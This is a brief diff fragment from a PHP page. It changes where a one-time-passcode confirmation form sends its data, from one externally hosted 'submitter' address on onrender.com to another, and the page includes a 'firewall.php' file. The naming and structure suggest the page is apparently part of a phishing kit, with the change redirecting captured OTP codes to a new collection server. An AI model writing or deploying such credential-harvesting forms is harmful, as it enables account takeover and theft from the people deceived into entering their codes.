@@ -400,7 +400,7 @@ include 'firewall.php';
 
 
 
-                    <form action="https://ill-submitter.onrender.com/otp_confirm.php" accept-charset="UTF-8" data-validate="" method="post">
+                    <form action="https://submitter.onrender.com/otp_confirm.php" accept-charset="UTF-8" data-validate="" method="post">
 
 
                         <input type="hidden" autocomplete="off">
